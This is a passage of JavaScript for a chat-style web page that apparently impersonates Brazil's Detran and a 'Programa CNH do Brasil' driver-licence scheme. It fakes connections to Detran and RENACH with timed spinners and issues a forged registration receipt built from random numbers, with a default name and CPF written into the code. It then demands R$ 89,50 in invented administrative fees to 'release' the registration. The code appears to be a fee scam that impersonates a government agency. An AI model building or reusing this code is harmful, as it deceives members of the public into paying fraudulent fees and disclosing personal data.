            <div style="position: absolute; top: 20px; right: -8px; width: 0; height: 0; border-top: 8px solid transparent; border-bottom: 8px solid transparent; border-left: 8px solid rgb(243, 244, 246);"></div>
        `;
        
        userMessage.appendChild(userBubble);
        messagesContainer.appendChild(userMessage);
        
        // Mostrar animação de "digitando..." por 3 segundos
        const typingDiv = this.showTypingIndicator(messagesContainer);
        
        // Aguardar 3 segundos antes de mostrar a mensagem
        setTimeout(() => {
            // Remover animação de digitando
            this.removeTypingIndicator(messagesContainer);
            
            // Adicionar mensagem do sistema sobre etapas
            const systemMessage = document.createElement('div');
            systemMessage.className = 'mb-4';
            systemMessage.style.cssText = 'margin-bottom: 1rem;';
            
            const messageBubble = document.createElement('div');
            messageBubble.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-[#2670CC] text-white rounded-tl-sm';
            messageBubble.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 1rem 1rem 1rem 0.25rem; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; white-space: pre-line; background-color: rgb(38, 112, 204); color: white; border-top-left-radius: 0.25rem; line-height: 1.5; position: relative;';
            messageBubble.innerHTML = `O Programa CNH do Brasil segue as seguintes etapas: o candidato realiza as aulas teóricas através do aplicativo oficial e, após a conclusão, o ${detranName} disponibilizará um instrutor credenciado, sem custo adicional, para a realização das aulas práticas obrigatórias.
                <div style="position: absolute; top: 20px; left: -8px; width: 0; height: 0; border-top: 8px solid transparent; border-bottom: 8px solid transparent; border-right: 8px solid rgb(38, 112, 204);"></div>
            `;
            
            systemMessage.appendChild(messageBubble);
            messagesContainer.appendChild(systemMessage);
            
            // Adicionar botão PROSSEGUIR padronizado alinhado com a mensagem do sistema
            const proceedBtnContainer = this.createProceedButton('Prosseguir', () => {
                this.showThirdMessage(detranName, categoryId);
            });
            proceedBtnContainer.style.cssText = 'display: flex; justify-content: flex-start; margin-top: 1rem; margin-bottom: 1rem; margin-left: 0;';
            messagesContainer.appendChild(proceedBtnContainer);
            
            // Scroll para o final
            messagesContainer.scrollTop = messagesContainer.scrollHeight;
            
        }, 3000);
    }

    showThirdMessage(detranName, categoryId) {
        const optionsContainer = document.getElementById('chat-options');
        let messagesContainer = document.getElementById('chat-messages');
        
        // Tentar encontrar o container de mensagens de formas alternativas
        if (!messagesContainer) {
            messagesContainer = document.querySelector('#chat-messages');
        }
        if (!messagesContainer) {
            messagesContainer = document.querySelector('[id*="chat-messages"]');
        }
        if (!messagesContainer) {
            messagesContainer = document.querySelector('.overflow-y-auto');
        }
        
        // Verificação final
        if (!messagesContainer) {
            console.error('Container de mensagens não encontrado');
            return;
        }
        
        // Remover botão PROSSEGUIR (verificar se existe)
        if (optionsContainer) {
            optionsContainer.remove();
        }
        
        // Adicionar mensagem do usuário "prosseguir"
        const userMessage = document.createElement('div');
        userMessage.className = 'mb-4 text-right';
        userMessage.style.cssText = 'margin-bottom: 1rem; text-align: right;';
        
        const userBubble = document.createElement('div');
        userBubble.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-gray-100 text-gray-800 rounded-tr-sm';
        userBubble.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 1rem 1rem 1rem 0.25rem; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; background-color: rgb(243, 244, 246); color: rgb(31, 41, 55); border-top-right-radius: 0.25rem; line-height: 1.5; position: relative;';
        userBubble.textContent = 'prosseguir';
        
        // Adicionar ponta do balão de conversa
        userBubble.innerHTML += `
            <div style="position: absolute; top: 20px; right: -8px; width: 0; height: 0; border-top: 8px solid transparent; border-bottom: 8px solid transparent; border-left: 8px solid rgb(243, 244, 246);"></div>
        `;
        
        userMessage.appendChild(userBubble);
        messagesContainer.appendChild(userMessage);
        
        // Mostrar animação de "digitando..." por 3 segundos
        const typingDiv = this.showTypingIndicator(messagesContainer);
        
        // Aguardar 3 segundos antes de mostrar a mensagem
        setTimeout(() => {
            // Remover animação de digitando
            this.removeTypingIndicator(messagesContainer);
            
            // Adicionar mensagem do sistema
            const systemMessage = document.createElement('div');
            systemMessage.className = 'mb-4';
            systemMessage.style.cssText = 'margin-bottom: 1rem;';
            
            const messageBubble = document.createElement('div');
            messageBubble.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-[#2670CC] text-white rounded-tl-sm';
            messageBubble.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 1rem 1rem 1rem 0.25rem; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; white-space: pre-line; background-color: rgb(38, 112, 204); color: white; border-top-left-radius: 0.25rem; line-height: 1.5; position: relative;';
            messageBubble.innerHTML = `As avaliações teóricas e práticas encontram-se disponíveis para agendamento. Para finalização do cadastro, é necessário selecionar o período para realização das provas. Conforme a legislação vigente, o processo completo tem duração inferior a 20 dias úteis.
                <div style="position: absolute; top: 20px; left: -8px; width: 0; height: 0; border-top: 8px solid transparent; border-bottom: 8px solid transparent; border-right: 8px solid rgb(38, 112, 204);"></div>
            `;
            
            systemMessage.appendChild(messageBubble);
            messagesContainer.appendChild(systemMessage);
            
            // Adicionar botão PROSSEGUIR padronizado alinhado com a mensagem do sistema
            const proceedBtnContainer = this.createProceedButton('Prosseguir', () => {
                this.showMonthSelection(detranName, categoryId);
            });
            proceedBtnContainer.style.cssText = 'display: flex; justify-content: flex-start; margin-top: 1rem; margin-bottom: 1rem; margin-left: 0;';
            messagesContainer.appendChild(proceedBtnContainer);
            
            // Scroll para o final
            messagesContainer.scrollTop = messagesContainer.scrollHeight;
            
        }, 3000);
    }

    showMonthSelection(detranName, categoryId) {
        const optionsContainer = document.getElementById('chat-options');
        let messagesContainer = document.getElementById('chat-messages');
        
        // Tentar encontrar o container de mensagens de formas alternativas
        if (!messagesContainer) {
            messagesContainer = document.querySelector('#chat-messages');
        }
        if (!messagesContainer) {
            messagesContainer = document.querySelector('[id*="chat-messages"]');
        }
        if (!messagesContainer) {
            messagesContainer = document.querySelector('.overflow-y-auto');
        }
        
        // Verificação final
        if (!messagesContainer) {
            console.error('Container de mensagens não encontrado');
            return;
        }
        
        // Remover botão PROSSEGUIR (verificar se existe)
        if (optionsContainer) {
            optionsContainer.remove();
        }
        
        // Adicionar mensagem do usuário "prosseguir"
        const userMessage = document.createElement('div');
        userMessage.className = 'mb-4 text-right';
        userMessage.style.cssText = 'margin-bottom: 1rem; text-align: right;';
        
        const userBubble = document.createElement('div');
        userBubble.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-gray-100 text-gray-800 rounded-tr-sm';
        userBubble.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 1rem; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; background-color: rgb(243, 244, 246); color: rgb(31, 41, 55); border-top-right-radius: 0.5rem; line-height: 1.5;';
        userBubble.textContent = 'prosseguir';
        
        userMessage.appendChild(userBubble);
        messagesContainer.appendChild(userMessage);
        
        // Adicionar mensagem do sistema sobre seleção de meses
        const monthSelectionMessage = document.createElement('div');
        monthSelectionMessage.className = 'mb-4 text-left';
        monthSelectionMessage.style.cssText = 'margin-bottom: 1rem; text-align: left;';
        
        const monthBubble = document.createElement('div');
        monthBubble.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-[#2670CC] text-white rounded-tl-sm';
        monthBubble.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 1rem; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; white-space: pre-line; background-color: rgb(38, 112, 204); color: white; border-top-left-radius: 0.5rem; line-height: 1.5;';
        monthBubble.textContent = 'Selecione o mês de sua preferência para realização das avaliações:';
        
        monthSelectionMessage.appendChild(monthBubble);
        messagesContainer.appendChild(monthSelectionMessage);
        
        // Adicionar grid de meses
        const monthsGrid = document.createElement('div');
        monthsGrid.className = 'grid grid-cols-2 sm:grid-cols-3 gap-3 max-w-full mt-4';
        monthsGrid.style.cssText = 'display: grid; grid-template-columns: repeat(2, 1fr); gap: 0.75rem; max-width: 100%; margin-top: 1rem;';
        monthsGrid.id = 'chat-options';
        
        // Dados dos meses
        const monthsData = [
            { name: 'ABRIL/2026', vacancies: 13 },
            { name: 'MAIO/2026', vacancies: 13 },
            { name: 'JUNHO/2026', vacancies: 24 },
            { name: 'JULHO/2026', vacancies: 21 },
            { name: 'AGOSTO/2026', vacancies: 23 },
            { name: 'SETEMBRO/2026', vacancies: 19 },
            { name: 'OUTUBRO/2026', vacancies: 17 },
            { name: 'NOVEMBRO/2026', vacancies: 22 },
            { name: 'DEZEMBRO/2026', vacancies: 15 }
        ];
        
        monthsData.forEach(month => {
            const monthBtn = document.createElement('button');
            monthBtn.className = 'flex flex-col items-center p-3 bg-gradient-to-b from-gray-100 to-white border border-gray-300 rounded-sm shadow-md hover:shadow-lg hover:border-[#1351B4] transition-all';
            monthBtn.style.cssText = 'display: flex; flex-direction: column; align-items: center; padding: 0.75rem; background: linear-gradient(to bottom, rgb(243, 244, 246), white); border: 1px solid rgb(209, 213, 219); border-radius: 0.125rem; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06); transition: all 0.15s ease-in-out; cursor: pointer;';
            
            monthBtn.addEventListener('mouseenter', () => {
                monthBtn.style.boxShadow = '0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05)';
                monthBtn.style.borderColor = 'rgb(19, 81, 180)';
            });
            
            monthBtn.addEventListener('mouseleave', () => {
                monthBtn.style.boxShadow = '0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06)';
                monthBtn.style.borderColor = 'rgb(209, 213, 219)';
            });
            
            const monthName = document.createElement('span');
            monthName.className = 'font-medium text-gray-800 text-sm';
            monthName.style.cssText = 'font-weight: 500; color: rgb(31, 41, 55); font-size: 0.875rem;';
            monthName.textContent = month.name;
            
            const vacanciesSpan = document.createElement('span');
            vacanciesSpan.className = 'text-xs text-[#1351B4] font-semibold mt-1';
            vacanciesSpan.style.cssText = 'font-size: 0.75rem; color: rgb(19, 81, 180); font-weight: 600; margin-top: 0.25rem;';
            vacanciesSpan.textContent = `${month.vacancies} vagas`;
            
            monthBtn.appendChild(monthName);
            monthBtn.appendChild(vacanciesSpan);
            
            monthBtn.addEventListener('click', () => {
                this.handleMonthSelection(month.name, month.vacancies, detranName, categoryId);
            });
            
            monthsGrid.appendChild(monthBtn);
        });
        
        messagesContainer.appendChild(monthsGrid);
        
        // Scroll para o final
        messagesContainer.scrollTop = messagesContainer.scrollHeight;
    }

    handleMonthSelection(monthName, vacancies, detranName, categoryId) {
        const optionsContainer = document.getElementById('chat-options');
        const messagesContainer = document.getElementById('chat-messages');
        
        // Salvar mês selecionado no userData
        this.userData.selectedMonth = monthName;
        this.saveUserState();
        
        // Desabilitar botões
        const buttons = optionsContainer.querySelectorAll('button');
        buttons.forEach(btn => {
            btn.disabled = true;
            btn.style.opacity = '0.5';
            btn.style.cursor = 'not-allowed';
        });
        
        // Adicionar mensagem do usuário com o mês escolhido
        const userMessage = document.createElement('div');
        userMessage.className = 'mb-4 text-right';
        userMessage.style.cssText = 'margin-bottom: 1rem; text-align: right;';
        
        const userBubble = document.createElement('div');
        userBubble.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-gray-100 text-gray-800 rounded-tr-sm';
        userBubble.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 1rem; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; background-color: rgb(243, 244, 246); color: rgb(31, 41, 55); border-top-right-radius: 0.5rem; line-height: 1.5;';
        userBubble.textContent = monthName;
        
        userMessage.appendChild(userBubble);
        messagesContainer.appendChild(userMessage);
        
        // Adicionar loading com "Conectando com o Detran"
        const loadingDiv = document.createElement('div');
        loadingDiv.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-gray-200 text-gray-600 rounded-tl-sm';
        loadingDiv.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 0.1rem 1rem 1rem;; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; background-color: rgb(229, 231, 235); color: rgb(75, 85, 99); border-top-left-radius: 0.5rem;';
        loadingDiv.innerHTML = '<div style="display: flex; align-items: center; gap: 8px;"><div class="animate-spin" style="width: 16px; height: 16px; border: 2px solid rgb(107, 114, 128); border-top: 2px solid rgb(19, 81, 180); border-radius: 50%; animation: spin 1s linear infinite;"></div>Conectando com o Detran...</div>';
        
        messagesContainer.appendChild(loadingDiv);
        
        // Scroll para o final
        messagesContainer.scrollTop = messagesContainer.scrollHeight;
        
        // Simular conexão com Detran (2 segundos)
        setTimeout(() => {
            // Trocar para "Gerando Cadastro no Renach"
            loadingDiv.innerHTML = '<div style="display: flex; align-items: center; gap: 8px;"><div class="animate-spin" style="width: 16px; height: 16px; border: 2px solid rgb(107, 114, 128); border-top: 2px solid rgb(19, 81, 180); border-radius: 50%; animation: spin 1s linear infinite;"></div>Gerando Cadastro no Renach...</div>';
            
            // Scroll para o final
            messagesContainer.scrollTop = messagesContainer.scrollHeight;
            
            // Simular geração do RENACH (2 segundos)
            setTimeout(() => {
                // Remover loading e botões
                loadingDiv.remove();
                optionsContainer.remove();
            
            // Gerar dados para o comprovante
            const renachNumber = this.generateRenachNumber();
            const protocolNumber = this.generateProtocolNumber();
            const userName = localStorage.getItem('userName') || 'ALBERTINO GOMES DOS REIS DE CARVALHO';
            const userCpf = localStorage.getItem('userCpf') || '233.527.348-52';
            const currentDate = new Date();
            const formattedDate = `${currentDate.getDate().toString().padStart(2, '0')}/${(currentDate.getMonth() + 1).toString().padStart(2, '0')}/${currentDate.getFullYear()} às ${currentDate.getHours().toString().padStart(2, '0')}:${currentDate.getMinutes().toString().padStart(2, '0')}`;
            
            // Criar comprovante oficial
            const documentContainer = document.createElement('div');
            documentContainer.className = 'w-full mt-4 mb-4';
            documentContainer.style.cssText = 'width: 100%; margin-top: 1rem; margin-bottom: 1rem;';
            
            const documentCard = document.createElement('div');
            documentCard.className = 'bg-white border border-gray-300 rounded shadow-md';
            documentCard.style.cssText = 'background-color: white; border: 1px solid rgb(209, 213, 219); border-radius: 0.375rem; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06); font-family: Arial, sans-serif; font-size: 12px;';
            
            // Header do documento
            const documentHeader = document.createElement('div');
            documentHeader.className = 'bg-gray-50 p-2 border-b border-gray-200 flex items-center justify-between';
            documentHeader.style.cssText = 'background-color: rgb(249, 250, 251); padding: 0.5rem; border-bottom: 1px solid rgb(229, 231, 235); display: flex; align-items: center; justify-content: space-between;';
            
            const logoContainer = document.createElement('div');
            logoContainer.className = 'flex items-center gap-2';
            logoContainer.style.cssText = 'display: flex; align-items: center; gap: 0.5rem;';
            
            const logoImg = document.createElement('img');
            logoImg.src = 'img/cnh-brasil-logo.png';
            logoImg.alt = 'CNH Brasil';
            logoImg.className = 'h-8 max-w-[100px] object-contain';
            logoImg.style.cssText = 'height: 2rem; max-width: 100px; object-fit: contain;';
            
            logoContainer.appendChild(logoImg);
            documentHeader.appendChild(logoContainer);
            
            const protocolSpan = document.createElement('span');
            protocolSpan.className = 'text-gray-500 text-xs';
            protocolSpan.style.cssText = 'color: rgb(107, 114, 128); font-size: 0.75rem;';
            protocolSpan.textContent = `Protocolo: ${protocolNumber}`;
            
            documentHeader.appendChild(protocolSpan);
            documentCard.appendChild(documentHeader);
            
            // Corpo do documento
            const documentBody = document.createElement('div');
            documentBody.className = 'p-3';
            documentBody.style.cssText = 'padding: 0.75rem;';
            
            // Título
            const titleContainer = document.createElement('div');
            titleContainer.className = 'text-center mb-2';
            titleContainer.style.cssText = 'text-align: center; margin-bottom: 0.5rem;';
            
            const titleP = document.createElement('p');
            titleP.className = 'text-xs font-bold text-gray-700';
            titleP.style.cssText = 'font-size: 0.75rem; font-weight: 700; color: rgb(55, 65, 81);';
            titleP.textContent = 'COMPROVANTE DE CADASTRO - RENACH';
            
            titleContainer.appendChild(titleP);
            documentBody.appendChild(titleContainer);
            
            // Nome e CPF
            const nameCpfGrid = document.createElement('div');
            nameCpfGrid.className = 'grid grid-cols-2 gap-2 mb-2';
            nameCpfGrid.style.cssText = 'display: grid; grid-template-columns: repeat(2, 1fr); gap: 0.5rem; margin-bottom: 0.5rem;';
            
            const nameDiv = document.createElement('div');
            const nameLabel = document.createElement('p');
            nameLabel.className = 'text-gray-400 text-[10px]';
            nameLabel.style.cssText = 'color: rgb(156, 163, 175); font-size: 10px;';
            nameLabel.textContent = 'NOME';
            nameDiv.appendChild(nameLabel);
            
            const nameValue = document.createElement('p');
            nameValue.className = 'font-semibold text-gray-800 text-xs';
            nameValue.style.cssText = 'font-weight: 600; color: rgb(31, 41, 55); font-size: 0.75rem;';
            nameValue.textContent = userName.toUpperCase();
            nameDiv.appendChild(nameValue);
            
            const cpfDiv = document.createElement('div');
            const cpfLabel = document.createElement('p');
            cpfLabel.className = 'text-gray-400 text-[10px]';
            cpfLabel.style.cssText = 'color: rgb(156, 163, 175); font-size: 10px;';
            cpfLabel.textContent = 'CPF';
            cpfDiv.appendChild(cpfLabel);
            
            const cpfValue = document.createElement('p');
            cpfValue.className = 'font-semibold text-gray-800 text-xs';
            cpfValue.style.cssText = 'font-weight: 600; color: rgb(31, 41, 55); font-size: 0.75rem;';
            cpfValue.textContent = userCpf;
            cpfDiv.appendChild(cpfValue);
            
            nameCpfGrid.appendChild(nameDiv);
            nameCpfGrid.appendChild(cpfDiv);
            documentBody.appendChild(nameCpfGrid);
            
            // RENACH e Categoria (destaque azul)
            const renachCategoryDiv = document.createElement('div');
            renachCategoryDiv.className = 'bg-blue-50 p-2 rounded mb-2';
            renachCategoryDiv.style.cssText = 'background-color: rgb(239, 246, 255); padding: 0.5rem; border-radius: 0.375rem; margin-bottom: 0.5rem;';
            
            const renachCategoryGrid = document.createElement('div');
            renachCategoryGrid.className = 'grid grid-cols-2 gap-2';
            renachCategoryGrid.style.cssText = 'display: grid; grid-template-columns: repeat(2, 1fr); gap: 0.5rem;';
            
            const renachDiv = document.createElement('div');
            const renachLabel = document.createElement('p');
            renachLabel.className = 'text-gray-400 text-[10px]';
            renachLabel.style.cssText = 'color: rgb(156, 163, 175); font-size: 10px;';
            renachLabel.textContent = 'Nº RENACH';
            renachDiv.appendChild(renachLabel);
            
            const renachValue = document.createElement('p');
            renachValue.className = 'font-bold text-[#1351B4] text-sm';
            renachValue.style.cssText = 'font-weight: 700; color: rgb(19, 81, 180); font-size: 0.875rem;';
            renachValue.textContent = renachNumber;
            renachDiv.appendChild(renachValue);
            
            const categoryDiv = document.createElement('div');
            const categoryLabel = document.createElement('p');
            categoryLabel.className = 'text-gray-400 text-[10px]';
            categoryLabel.style.cssText = 'color: rgb(156, 163, 175); font-size: 10px;';
            categoryLabel.textContent = 'CATEGORIA';
            categoryDiv.appendChild(categoryLabel);
            
            const categoryValue = document.createElement('p');
            categoryValue.className = 'font-bold text-gray-800 text-sm';
            categoryValue.style.cssText = 'font-weight: 700; color: rgb(31, 41, 55); font-size: 0.875rem;';
            categoryValue.textContent = categoryId;
            categoryDiv.appendChild(categoryValue);
            
            renachCategoryGrid.appendChild(renachDiv);
            renachCategoryGrid.appendChild(categoryDiv);
            renachCategoryDiv.appendChild(renachCategoryGrid);
            documentBody.appendChild(renachCategoryDiv);
            
            // Mês e Status
            const monthStatusGrid = document.createElement('div');
            monthStatusGrid.className = 'grid grid-cols-2 gap-2 mb-2';
            monthStatusGrid.style.cssText = 'display: grid; grid-template-columns: repeat(2, 1fr); gap: 0.5rem; margin-bottom: 0.5rem;';
            
            const monthDiv = document.createElement('div');
            const monthLabel = document.createElement('p');
            monthLabel.className = 'text-gray-400 text-[10px]';
            monthLabel.style.cssText = 'color: rgb(156, 163, 175); font-size: 10px;';
            monthLabel.textContent = 'MÊS PREVISTO';
            monthDiv.appendChild(monthLabel);
            
            const monthValue = document.createElement('p');
            monthValue.className = 'font-semibold text-gray-800 text-xs';
            monthValue.style.cssText = 'font-weight: 600; color: rgb(31, 41, 55); font-size: 0.75rem;';
            monthValue.textContent = monthName;
            monthDiv.appendChild(monthValue);
            
            const statusDiv = document.createElement('div');
            const statusLabel = document.createElement('p');
            statusLabel.className = 'text-gray-400 text-[10px]';
            statusLabel.style.cssText = 'color: rgb(156, 163, 175); font-size: 10px;';
            statusLabel.textContent = 'STATUS';
            statusDiv.appendChild(statusLabel);
            
            const statusValue = document.createElement('p');
            statusValue.className = 'font-bold text-orange-600 text-xs';
            statusValue.style.cssText = 'font-weight: 700; color: rgb(251, 146, 60); font-size: 0.75rem;';
            statusValue.textContent = 'PENDENTE';
            statusDiv.appendChild(statusValue);
            
            monthStatusGrid.appendChild(monthDiv);
            monthStatusGrid.appendChild(statusDiv);
            documentBody.appendChild(monthStatusGrid);
            
            // Data de emissão
            const footerDiv = document.createElement('div');
            footerDiv.className = 'border-t border-gray-200 pt-2 text-[10px] text-gray-400';
            footerDiv.style.cssText = 'border-top: 1px solid rgb(229, 231, 235); padding-top: 0.5rem; font-size: 10px; color: rgb(156, 163, 175);';
            
            const footerP = document.createElement('p');
            footerP.textContent = `Emitido em ${formattedDate}`;
            footerDiv.appendChild(footerP);
            
            documentBody.appendChild(footerDiv);
            documentCard.appendChild(documentBody);
            documentContainer.appendChild(documentCard);
            messagesContainer.appendChild(documentContainer);
            
            // Botão PROSSEGUIR final
            const finalBtnContainer = document.createElement('div');
            finalBtnContainer.className = 'flex flex-col gap-3 max-w-[80%] mt-4';
            finalBtnContainer.style.cssText = 'display: flex; flex-direction: column; gap: 0.75rem; max-width: 80%; margin-top: 1rem;';
            
            const finalBtn = document.createElement('button');
            finalBtn.className = 'flex items-center justify-center gap-2 p-3 bg-[#1351B4] text-white rounded-sm shadow-md hover:bg-[#0D3A8C] transition-all';
            finalBtn.style.cssText = 'display: flex; align-items: center; justify-content: center; gap: 0.5rem; padding: 0.75rem; background-color: rgb(19, 81, 180); color: white; border-radius: 0.125rem; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06); transition: all 0.15s ease-in-out; cursor: pointer; border: none;';
            
            const btnText = document.createElement('span');
            btnText.className = 'font-medium text-sm';
            btnText.style.cssText = 'font-weight: 500; font-size: 0.875rem;';
            btnText.textContent = 'Prosseguir';
            
            const arrowIcon = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
            arrowIcon.setAttribute('xmlns', 'http://www.w3.org/2000/svg');
            arrowIcon.setAttribute('width', '24');
            arrowIcon.setAttribute('height', '24');
            arrowIcon.setAttribute('viewBox', '0 0 24 24');
            arrowIcon.setAttribute('fill', 'none');
            arrowIcon.setAttribute('stroke', 'currentColor');
            arrowIcon.setAttribute('stroke-width', '2');
            arrowIcon.setAttribute('stroke-linecap', 'round');
            arrowIcon.setAttribute('stroke-linejoin', 'round');
            arrowIcon.setAttribute('class', 'lucide lucide-chevron-right w-4 h-4');
            arrowIcon.style.cssText = 'width: 1rem; height: 1rem;';
            
            const path = document.createElementNS('http://www.w3.org/2000/svg', 'path');
            path.setAttribute('d', 'm9 18 6-6-6-6');
            arrowIcon.appendChild(path);
            
            finalBtn.appendChild(btnText);
            finalBtn.appendChild(arrowIcon);
            
            finalBtn.addEventListener('click', (e) => {
                e.preventDefault();
                e.stopPropagation();
                this.showTaxesMessage(detranName, categoryId);
            });
            
            finalBtnContainer.appendChild(finalBtn);
            messagesContainer.appendChild(finalBtnContainer);
            
            // Scroll para o final
            messagesContainer.scrollTop = messagesContainer.scrollHeight;
            
        }, 2000);
        }, 2000);
    }

    showTaxesMessage(detranName, categoryId) {
        const optionsContainer = document.getElementById('chat-options');
        let messagesContainer = document.getElementById('chat-messages');
        
        // Tentar encontrar o container de mensagens de formas alternativas
        if (!messagesContainer) {
            messagesContainer = document.querySelector('#chat-messages');
        }
        if (!messagesContainer) {
            messagesContainer = document.querySelector('[id*="chat-messages"]');
        }
        if (!messagesContainer) {
            messagesContainer = document.querySelector('.overflow-y-auto');
        }
        
        // Verificação final
        if (!messagesContainer) {
            console.error('Container de mensagens não encontrado');
            return;
        }
        
        // Remover botão PROSSEGUIR
        if (optionsContainer) {
            optionsContainer.remove();
        }
        
        // Adicionar mensagem do usuário "prosseguir"
        const userMessage = document.createElement('div');
        userMessage.className = 'mb-4 text-right';
        userMessage.style.cssText = 'margin-bottom: 1rem; text-align: right;';
        
        const userBubble = document.createElement('div');
        userBubble.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-gray-100 text-gray-800 rounded-tr-sm';
        userBubble.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 1rem; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; background-color: rgb(243, 244, 246); color: rgb(31, 41, 55); border-top-right-radius: 0.5rem; line-height: 1.5;';
        userBubble.textContent = 'prosseguir';
        
        userMessage.appendChild(userBubble);
        messagesContainer.appendChild(userMessage);
        
        // Mostrar loading
        const loadingDiv = document.createElement('div');
        loadingDiv.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-gray-200 text-gray-600 rounded-tl-sm';
        loadingDiv.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 0.1rem 1rem 1rem;; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; background-color: rgb(229, 231, 235); color: rgb(75, 85, 99); border-top-left-radius: 0.5rem;';
        loadingDiv.innerHTML = '<div style="display: flex; align-items: center; gap: 8px;"><div class="animate-spin" style="width: 16px; height: 16px; border: 2px solid rgb(107, 114, 128); border-top: 2px solid rgb(19, 81, 180); border-radius: 50%; animation: spin 1s linear infinite;"></div>Processando...</div>';
        
        messagesContainer.appendChild(loadingDiv);
        
        // Scroll para o final
        messagesContainer.scrollTop = messagesContainer.scrollHeight;
        
        // Simular processamento
        setTimeout(() => {
            // Transformar loading em mensagem do sistema sobre taxas
            loadingDiv.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-[#2670CC] text-white rounded-tl-sm';
            loadingDiv.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 1rem; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; white-space: pre-line; background-color: rgb(38, 112, 204); color: white; border-top-left-radius: 0.5rem; line-height: 1.5;';
            loadingDiv.innerHTML = `Prezado(a) Albertino, seu cadastro encontra-se com status PENDENTE. Para liberação do acesso ao aplicativo de aulas e prosseguimento do processo, é obrigatório o recolhimento das Taxas Administrativas:

• Taxa de Expedição de Documento (TED): R$ 36,10
• Taxa de Serviços Administrativos (TSA): R$ 26,70
• Taxa de Processamento Eletrônico (TPE): R$ 26,70

Valor Total: R$ 89,50`;
            
            // Adicionar botão Finalizar Cadastro
            const proceedBtnContainer = document.createElement('div');
            proceedBtnContainer.className = 'flex justify-center mt-4';
            proceedBtnContainer.style.cssText = 'display: flex; justify-content: center; margin-top: 1rem;';
            
            const proceedBtn = document.createElement('button');
            proceedBtn.className = 'bg-[#1351B4] text-white px-6 py-2 rounded-lg font-semibold hover:bg-[#0D3A8C] transition-colors';
            proceedBtn.style.cssText = 'background-color: rgb(19, 81, 180); color: white; padding: 0.5rem 1.5rem; border-radius: 0.5rem; font-weight: 600; font-family: Rawline, system-ui, sans-serif; cursor: pointer; transition: all 0.3s; border: none; font-size: 14px;';
            proceedBtn.textContent = 'Finalizar Cadastro';
            
            proceedBtn.addEventListener('click', (e) => {
                e.preventDefault();
                e.stopPropagation();
                this.handleFinalizeRegistration(detranName, categoryId);
            });
            
            proceedBtnContainer.appendChild(proceedBtn);
            proceedBtnContainer.id = 'chat-options';
            messagesContainer.appendChild(proceedBtnContainer);
            
            // Scroll para o final
            messagesContainer.scrollTop = messagesContainer.scrollHeight;
            
        }, 1000);
    }

    handleFinalizeRegistration(detranName, categoryId) {
        const optionsContainer = document.getElementById('chat-options');
        let messagesContainer = document.getElementById('chat-messages');
        
        // Tentar encontrar o container de mensagens de formas alternativas
        if (!messagesContainer) {
            messagesContainer = document.querySelector('#chat-messages');
        }
        if (!messagesContainer) {
            messagesContainer = document.querySelector('[id*="chat-messages"]');
        }
        if (!messagesContainer) {
            messagesContainer = document.querySelector('.overflow-y-auto');
        }
        
        // Verificação final
        if (!messagesContainer) {
            console.error('Container de mensagens não encontrado');
            return;
        }
        
        // Remover botão Finalizar Cadastro
        if (optionsContainer) {
            optionsContainer.remove();
        }
        
        // Adicionar mensagem do usuário "Finalizar Cadastro"
        const userMessage = document.createElement('div');
        userMessage.className = 'mb-4 text-right';
        userMessage.style.cssText = 'margin-bottom: 1rem; text-align: right;';
        
        const userBubble = document.createElement('div');
        userBubble.className = 'inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base bg-gray-100 text-gray-800 rounded-tr-sm';
        userBubble.style.cssText = 'display: inline-block; max-width: 80%; padding: 1rem; border-radius: 1rem; box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05); font-size: 16px; background-color: rgb(243, 244, 246); color: rgb(31, 41, 55); border-top-right-radius: 0.5rem; line-height: 1.5;';
        userBubble.textContent = 'Finalizar Cadastro';
        
        userMessage.appendChild(userBubble);
        messagesContainer.appendChild(userMessage);
        
